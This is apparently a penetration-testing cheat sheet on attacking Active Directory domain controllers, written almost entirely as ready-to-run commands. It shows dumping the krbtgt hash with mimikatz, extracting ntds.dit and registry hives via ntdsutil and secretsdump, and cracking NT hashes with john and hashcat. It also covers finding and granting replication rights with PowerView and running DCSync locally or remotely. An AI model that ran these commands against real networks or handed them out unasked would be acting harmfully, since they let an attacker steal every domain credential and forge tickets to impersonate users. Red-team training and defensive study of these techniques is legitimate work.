# Domain Controller specific

## TGT Dump

dump the hash used by the domain controller to sign Kerberos tickets. This allows an attacker to create custom tickets and impersonate other users or gain access to different services/hosts

```
lsadump::dcsync /user:krbtgt
sekurlsa::krbtgt
lsadump::lsa /inject /name:krbtgt
```

## NTDS Dump

NTDS is an encrypted database containing information about the structure and elements of the AD.

In order to dump the stored hashes we need to extract the following files.

```
C:\Windows\NTDS\ntds.dit
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
```

To dump the required files use the following command in PowerShell

```
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full <dump folder>' q q"
```

Extract the hashes

```
secretsdump.py -security <security file> -system <system file> -ntds <path to ntds.dit> LOCAL
```

Crack the hashes.  In order to obtain the passwords we need only the NT part of the hash. given an hash with the following structure `AAAA:BBBB` the actual string to bruteforce is the one to the right of the column

```
john -format=NT -wordlist=<wordlist> <hashfile>
hashcat -m 1000 -a 0 --force --show --username <hash> <wordlist> #rows follow the format <user>:<hash>
```

## DC Sync&#x20;

To execute this attack we need to operate under a user with the `Replicating Directory Changes All` and `Replicating Directory Changes` privileges. By default Local and Domain Administrators own these privileges.

Find users with the required privileges with PowerView

```
Get-ObjectACL -DistinguishedName "dc=<domain>,dc=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }
```

If the current user lacks the required permissions run this command on the DC to add them.

```
Add-ObjectAcl -TargetDistinguishedName "dc=<domain>,dc=local" -PrincipalSamAccountName <user
```

### Run on DC

```
lsadump::dcsync /user:krbtgt                    //Kerberos TGT
lsadump::dcsync /user:<user>                    //get user info 
lsadump::dcsync /domain:htb.local /all /csv     //dump all users
```

### Run remotely

```
secretsdump.py -just-dc  <domain>/<DC user>@<DC IP>      //dump NTDS
secretsdump.py -just-dc-ntlm <domain>/<DC user>@<DC IP>  //dump TGT
```
